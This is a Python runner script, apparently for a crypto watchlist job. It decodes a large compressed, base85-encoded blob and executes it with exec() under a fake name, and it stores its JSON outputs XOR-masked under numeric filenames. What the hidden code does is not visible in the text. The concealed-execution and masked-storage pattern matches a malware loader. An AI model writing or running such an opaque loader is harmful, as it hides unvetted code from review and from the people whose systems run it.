import base64, shutil, sys, zlib
from pathlib import Path

REQ = "requests==2.34.2\n"
KEY = bytes([0x5e,0x21,0xa9,0x8c,0x0f,0x73,0xd4,0xb6,0x11,0xc2,0xee,0x9a,0x48,0x73,0x5f,0xd0])
SOURCE = 'c-p-jYjfK+^1FTokNr?GrD@4=+EiC%#@9HlXHv(LIGt&A8V)T%7Hf)R`LM0}^xtoH0T2KmlHB$#Z6lG`T`U&+2GlS9aa<Mo@lBK*v*g~&HsvZ!UJh*A{xn~)MHRD!wGQ(;Rvs<FGPJThowK5dl3VMy^u`Cc!7@+RRuC+!vdUQySkXF5^U?~FBrU@-N|RzRkni%_EX)fgpMNXTM1C)$HRH7AX)>?!oF%2ti58OP^(trK;wnw!^G7zX$~5<^un6YqI*VD!791ZKWk^k8$!Cw|Sg^PZ`PV<vL`<25<tmPDB*qmy@_}-b;abJ}vt+|xBW9E=Q#tS}JYT?bz0#chUa_KtrT={X@zceJOKW1;BOm^;2baGD*T2HEL~`u2HOr%Ucznqof?v}7&UObMK3@X}GUC{2Rc2KQFW+DMd>&k#UH=F}2ykrK^L&$)Y48x1b67!9261%Hd=#ubcz1Dm_I@usNT(<T#^C!8m+vlq0Pv@Q1%K?{tF&Z6SQM<Z$Cmy1)7xv?<3q4bWggDU0A$1p7=5y@&OctAUw=M(Z+n(~{qgMW#k-3@z1#}S`!ufBEI2t`1?wmYs$v1yqv0?Z^8fsy01WSM0|7i5E;Qhi4qyNTb&I2N6O0}RHk%{UUn_Epd~~XfysAg=9V`Vz7gP!S4LXXLLpgpIM+pPbuA`D>muTT*@BsS-@bLPzcw3->q)Cvcahw9JV3k&RP?d8;eOaTTQ3YsJ!A)3@0H-uW!>h8)it+LBGRz_$tTRmJ%m+Oe!Z%<LB#W{z^3(iQ0L;9>b};zy{Om2LpW4pP1<Q}lZo#y0H-Ae1h~hXr206%0J)6&2MuTCN#h{aDz{jW@UdbNI<17xN#Cvi4!lnrZ3$~QH9w3xMWP}99wHf%I_!~Y;mB(YND0BYwf`5Qx2-n5fT14}5ii2ovGwVOrC721U06#cnSe9&^l>i$hC5)W%*J#mTDPwCHry;%{y~h1@t)n+cYD_?JSOCQNBd!woG077I_=j*)z#C@-=+=q<%0oqQX>gh5a(bBD%ERQAIg%fDT<=YpZ`1?+$$_Adihs*W2SnhBB~SQ=XRW}ufhJAFu6c4r6Y=R96eAG4Ux0_L&;c%(^#&v{9GcV8)L~RG>tmH5ne#kPb7yJ)czu0kJsAYHwmCu0!1ux$$u&4?jFIp(8HNSEGbctl!;%}bKEblL;3&{zIDq5&L6C%C-2uLZ7fl{uky6}WStIK^wfC)M;yiv4GnP4g3#VYza&J5<W{G$Y3So`h8K0;_IG}qDvhU*Tv<?;nOwGN}X=@oq5FLSGZUysInieb&c8w<O^qK+bWLZJb;+k&i{A^t78j?Xp<8FD{;WcJElr9T5U<wP^2g5`KTOKY6iEPQs9N&+QVFy;I(ioN6I|1?BiXilZ&VV;^1a;26YXP_20Hp7Bv02}wabdf#6%cmZgY?v{684y}IfQmg=glfsVaB@k6<6fRrS~eWIX#B5D5+SVO4xb|RDd_1GpkC%d(eRJCT6t`Xz>c-6vixvA_urCT=bOwqAey3AV<YHK~)0{<<KrD`be{6&e6|dTuFWs1`>HQ84V%1iQ)|`8X^!E2Y!Ve=ai;LKxa14#8Xsjhvs$erl-Kh3rjw|f+y6uJ5)HN;zGVKg7_*HXU12EpnrO8-yE>CZ`v!n4`VqQQJ=vwr?c8th;O;<Z^oKotfJc$s9pL12y(S2Gtfl&@N%Y93AshciPi9>ZC3wad5XZAA|j7Igie+$90%tGX9Ex@%J8Oe=<5s2b!0@*wgqt!5QRnGrB+ee@>c{tIz2?0PWLO*sZge39R{?ziJ?#@ohoz+DkPEkCg?aXcjC-raH?wCBp)->UAa~PV{BN@W)Y}uNZzT}awIuK4meS<RbnHS43g%6GvT10;aQBueVcfoB#}~+rk8K*no!U$TG0V~D7jK_ayjfwIM36fuy~$nl~e*1zI6tf$^sKK01+Nt(8~}kEbhP^rO~25R#*;9m5}zKt4qM40`yS^b=0vywJ;H2AU3G(e4_IZm8%wOj*HQrvl7VgRtufn<D?@Wlz&V_&lqb3BQ9s#YlJjPnVv*Efkc&mfqH|M33h|Y>u7-$h|JgNbE^o|n$rka$bTz5b%lc)2&%*$thLCX!foi3<OvB1-6`f_5~Mgwl0INDFs|!T(i1ZU80%@Y5~;Qi!aOn7$;cQ`MLOA$iGW9;1ez)xJ=Ja`AXqSLYsVTv3WdgL%wtA%4;-;3v$klFhR76lgkFJ*z=A%dr?zYTV<HO5%OC9L5RgUc^#=0=&Xr218YS%PIh3g~KBK~z*poE%ig_PFE<TX9wqmZ=Mm!S!#h}Ia5ckaC!|qJb;d{(bQ)Q?CC@olu@W3fxc&M|>jw)DN0w*b>o6R9D32EIhbnZYST32gZs9G7#u{u6H1?33GC#S32?z2-t^dM8^uoiHfrC2U<3k9F4rIva&$>G6xvbt)fodP+R<_@`ItE|V-PDr%`Z-&ljoXc!EOcqvy9%6Hu67rS{@D`lJ$*I`K-jYG2GP6cXB>m8ufn%=8`=}*_qnE2(NE2=K#GBBprd@NWJ-XehMt;Aq<2Wav+0oCGG=of=3A=-aOIzt_(fj}(0<*nQM%mGEYS<>1bDg^BlJkI=EA*K+g3zz)?z0)$mH*`M(ijznut)={xQk%+MQ}Pi?FXf>-0p)qS}SUzszueFno;D&kgwJ)yQ{jQQ;-EHzo>2?YC3w(<B5PHg(K(DyJHXr#JCyVHEj&wU(`k}@)~Sw7!&YD8mo189l>v7_iHCAhNtj3Gay>3D9}8au>gh-m{nXlZVOOt`4n()D=4h%AP2QX@Xs3jUU*9ht-Y%YG9AAh4reWN&}-hg0Tr=PJc3?(qE4-va#7(D1Y!#hTOGToaZT<Z#M7VjL57@mMj@k5QdG-jG>;$~?F>&%$A#vn)I~AJby8L*v_ZR^mZ+WfI*$IzsmZ-`7R?C{bBE#mEtKz*{+@wJ5I{y)I`viICNz|cNV-utKC_3{v*XX!+*%gRE#V?~Q~QygcK-os8B*gCdZYXNj`M&6iJ<_s_+g$L^wCg>2-tzt4%4-&x&_3@zi<7kMv-GfQo4we+xv(;5ahouF3&E%KOc8uY+Yr1ev#&|+iWw5!}ZM~wDPf)PvxYlWHyYjC&6n}XF7_t0<%p)qpc@27k$Xx3ga#QY1s`DMTnk!^7N(mrT-gbV-9i)e%-*Ijz`0pyS3ZZnh{G?W=2Hucnv1xWSe!RklN%)IIFGQ8=Itq27e=%(`S{L6EOLD)?je20Ku2#(cEYsL%0$m)Ms(G$MlXnyh8-aKMk4jvy3RbP0|9=Ei=fs`pBSV6xtO;qYi*5T+yMCRyk<UB5%}zR4S<h@--QNVwoC{2wc@1kD3iw<?7q;B)kr2A=DmtE;{4z4gYjC7zhDgNG<y7N_3)m%2`_gDsp!$OB;1}qW(WusLgx8GIhHTgiA42YB+{{i1j+Vy$Uel>4lYO)o4ah%vWq32B_~45~+<;AB++}UL^^rv;q)k`x=O7SOD(#AAY)ee|~*#%aFo%pC2aKS7#ruFYugPGYtmBv7Hx$r8q4Xts*}x<aGr{e(~YG>qkWj+p>m|N*B*EO2XI>B*q3Eg7X4{{EIfCxeR-(I}lwCKn(`*qZX-ZazP>uQ5S^%j7}F%zIPw~>Sw<}oZjwBG_|wZAW1!buuFZc1TqYiwBro<5$}*6@nWqN=H+B$wz3G(4EfE&Mt8@_FD(t5-pvl+Gt;q}&{Hcv->bUMP~i?$es^~9{`_qhxxY<kdvtf$0a5Gjbay5?>%cX&`)S)HA+Frh2D<WvnhN&hcme{bX!<wk7B1gav)kE#HANDEVd+TvsAmo7Aa>X!QOgWX#y}S%gf^Wu@l1K?c=`w->%!a`)mPUN@wi60NK?^oau(ikYcC2$m#Ike#j!~33;64)4W1m_zq}b>qYI!cMeUPoz-t2ptUc?IfrCrWChqj0CkyZj80xswRDU`GA}0r*d{K*%Hw?)C`G~3XzlrYl8Vx4}?h9y@K9Y0lv>0CC1tYy&>A!(A(@$$Q)>jjCC(eNv1^7N)2JlL^S0M~MS*LquPKQGmPJ68PZtHt%K6?ZOG<uI>rg~Qm2Py`!XYAvwg`-Ge3oO7(Ne)ZqDb`C9yDFDQuVovt|IA;XlP?JsV1wDNYEIK$s~znQTmO?BLYp7c8SPPns<MUYc+~|d8t3==f_1uJy@M2zYFE?)!_)9(6?5>u`ABwMj$4)zT|@Hx$n>{1O(gQV=9td93I%--{SMy%Yq*e_NtxIrXaI5a2juXmz@Tf6{L+)O9B3Iem0o+`2eT912I%XeT4zPgg;03{_Omo|pxj*FfRe4EEXXU!i#^VkoLtwR`-GZ_d?q}ZXeyUHHzNqG^v1_&6L{9|@HF<!>0S4re4%E(UpL!p*{#PtOUpyLr=a-VIiuSY$?iFKNC@UVOcWGYfk`SSYGs+n47C|jm_|P}pVy0g=E*IfHm-QV8}sC9PfIPQJ0E?0FrcOyR6F}%^}PCP;!5w30l6<Zxi4qiW@C+ZLC>VrTGR+;QO!h1_%KLru~m|$vBK1bbTsogBaIiHm9Pig1+y`P8C(v!@_PjiW*OBc;aOb+s6GweP&d2r+wU9bZu5o{DZN-2a7)6K&#;8{4b<?V<04=BFa_klL(6O0O0i|m4c|4NH?0*KrxhIlh2&XUPxNtYJvMuyBG{N#BQHMaW}`=@zwy=s7rnX$&?>BGD|*Ha4<wlDDNRH=pa{{6rnYyKb$`3R>MMxamp>YiN}+W_)-Pt5<Gn>uE9jea8p8+HRtmqjvf7$@t7{Z0ulPPadU+ym+i}Q7>WHu+c{J`GA+ShW)-1neBCFk#uXxm-7`N^fpnmL5g7y4V-EwbKN=SU#)~lJ!)H!c}z9Z9eyAmgquKX_4Mo*vVYL1c6o1q$J>`VOxYsP_SjU#3pJY#?Qv!y=a4B8n5nJb;U!k3P5J)@VTO>62y66#9TGb*yeY$$Rc0X@|=r|#$#^bzT(<ta?pw0f<w-=^BGP`W|<*xiBc+nTPHZ(G(HRJYesDErzt-QMZ|xpZ}XcW<yLeRg}P&iBG+Njq%|gzoWmw0%t9MG=z!0<d)n3zG{KyQv9nBwCnk?#Og|?qva%elrUmJ8t8t8<AoX`76bHyqIJ*HIPd!F+_>I3&E8PS}D2OL2NuWQi}R+3*Gb6GiA4tUQ1qjZa@&ng;sy=O3oVzIzRJiL;RWSoS($nosHklWcLsg)JpolOv0!TMjZe~C2*Zrtglb3X|Z;DLf6;!WgF6)?p5p!6b21#8PbO;rEZiu_|vL3g@*RxN(cM$?S?(<&AMes)LKWfd)u7FKrlK=Gx39h5t-FvZT&inU;&RE)!N`$CHqe4cVu4=IV6Jt|M70&&?0x_S9JIUPEsXX%2+>qzV_F5izs)p5G7npNbz_Y5~O$Z$XBEKqkMX5kZKJhVgoRf0)MR?7V{{YkZ1Bha0{S4IYEW6|BV%7tFbCQJ914e{48huHx=YJ`3m}a`xN4OJ6Xh-b^(;2r#vn~I=E0;*as2ZY*c=vIIH2+&!Kx{LzMo!Y(&ltbscW|5|YS`vnU&<pOL(9BRlM(d;h}vdI+@PkrSwYTU(?t=xbP&DJ`z&P!)8>XfFZ;CDXgl;yCCU(@BHtdJMMuwPfw&mG#{Oq2cdu>18W^i(i)?<!lLzuWarxl1(=&^gDPyPtxWg*{FPf<3BKVhi_dx=6KcLEd}UrCBv_X;e;3-4dvUH9c-_|D6u8}=tP2^4mAQV<=atvdai?t!mCaSU+<z|s%!gz0$FrS4Wj>*0^Rcy|62wBEWfSRpr=<fBHAY$%nujfvBbFQK-ot}WHKs<%~xpz9&iF)7IY5VNb4|xV1(Zq+v^F*c~StLwhk@00{>wZmlHv8pe{`TL)fVlEYb%uSqRpJ(&&vOc-5i9+#mH@3$-7RuwQ#F;)S;(>H)*OwbG?5$1rLq=~0?#4HvOjLlGSzNXWzf)=daua0&lWk6xW?M{2wh=aGRUbOaJU?D4#?m1YY!${E%i+};Z4uv$jM`8rMNu43H&BQ07&SGC@Io}^*u18)B@lZIi8?5wGJ>#5E%s$D_#UZm+MhDE8hC*~MOvcsOr$_Tn#uTQ{t0I<9nK_EeZCL07IF7uzveA*PS&hy8pbhw{!2mb|oqC_('
FILES = {"0": "crypto_watchlist_live.json", "1": "crypto_watchlist_latest.json"}
MODES = {
    "0": "auto",
    "1": "manual",
    "2": "crypto-refresh",
    "3": "main",
    "4": "final",
    "5": "preclose",
    "8": "auto",
}

def _encode(raw: bytes) -> bytes:
    compressed = zlib.compress(raw, 9)
    masked = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(compressed))
    return base64.b85encode(masked)

def _decode(raw: bytes) -> bytes:
    masked = base64.b85decode(raw.strip())
    compressed = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(masked))
    return zlib.decompress(compressed)

def _restore() -> None:
    shutil.rmtree("output", ignore_errors=True)
    out = Path("output")
    out.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("o") / slot
        if src.exists():
            (out / name).write_bytes(_decode(src.read_bytes()))

def _persist() -> None:
    target = Path("o")
    target.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("output") / name
        if src.exists():
            (target / slot).write_bytes(_encode(src.read_bytes()))

def _run(mode: str) -> int:
    _restore()
    old_argv = sys.argv[:]
    code = 0
    try:
        sys.argv = ["runner2", "--mode", mode]
        source = zlib.decompress(base64.b85decode(SOURCE)).decode("utf-8")
        ns = {"__name__": "__main__", "__file__": "<runner2>"}
        try:
            exec(compile(source, "<runner2>", "exec"), ns, ns)
        except SystemExit as exc:
            code = int(exc.code or 0)
    finally:
        sys.argv = old_argv
        _persist()
        shutil.rmtree("output", ignore_errors=True)
    return code

def main() -> int:
    arg = sys.argv[1] if len(sys.argv) > 1 else "8"
    if arg == "7":
        sys.stdout.write(REQ)
        return 0
    mode = MODES.get(arg)
    if mode is None:
        print(f"unsupported mode: {arg}", file=sys.stderr)
        return 2
    return _run(mode)

if __name__ == "__main__":
    raise SystemExit(main())
